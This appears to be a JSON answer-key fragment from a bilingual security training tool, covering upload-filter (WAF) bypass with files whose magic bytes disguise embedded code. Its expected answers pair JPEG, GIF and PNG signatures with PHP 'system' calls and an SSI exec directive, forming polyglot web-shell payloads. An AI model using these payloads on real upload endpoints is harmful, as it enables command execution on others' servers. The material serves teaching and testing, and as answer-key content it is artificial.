  {
   "id": "file-upload-signature-content-mismatch",
   "patches": [
    {
     "area": "wafBypass",
     "index": 0,
     "expectedCommand": "FFD8FFE0 + \"<?php system('id');?>\"",
     "syntaxBreakdown": [
      {
       "part": "FFD8FFE0",
       "explanation": {
        "zh": "JPEG 魔数",
        "en": "JPEG magic bytes"
       },
       "type": "value"
      },
      {
       "part": "\"<?php system('id');?>\"",
       "explanation": {
        "zh": "脚本内容",
        "en": "Script content"
       },
       "type": "payload"
      }
     ]
    },
    {
     "area": "wafBypass",
     "index": 1,
     "expectedCommand": "GIF89a + \"<!--#exec cmd=\\\"id\\\"-->\"",
     "syntaxBreakdown": [
      {
       "part": "GIF89a",
       "explanation": {
        "zh": "GIF 魔数",
        "en": "GIF magic bytes"
       },
       "type": "value"
      },
      {
       "part": "<!--#exec cmd=\\\"id\\\"-->",
       "explanation": {
        "zh": "SSI 指令",
        "en": "SSI directive"
       },
       "type": "payload"
      }
     ]
    },
    {
     "area": "wafBypass",
     "index": 2,
     "expectedCommand": "89504E470D0A1A0A + <?php system(\"id\");?> + IEND",
     "syntaxBreakdown": [
      {
       "part": "89504E470D0A1A0A",
       "explanation": {
        "zh": "PNG 魔数",
        "en": "PNG magic bytes"
       },
       "type": "value"
      },
      {
       "part": "<?php system(\"id\");?>",
       "explanation": {
        "zh": "PHP 代码",
        "en": "PHP code"
       },
       "type": "payload"
      },
      {
       "part": "IEND",
       "explanation": {
        "zh": "PNG 结尾块",
        "en": "PNG IEND chunk"
       },
       "type": "value"
      }
     ],
     "description": {
      "zh": "PNG 魔数与 IEND 之间夹入 PHP 代码的拼接体：PHP 解析器可执行其中代码，宽大的图片解析器可能仍按图片处理。判据：PHP 代码被执行且图片解析不报错。",
      "en": "Valid as both PNG and PHP. Success: both parsers succeed."
     }
    }
   ]
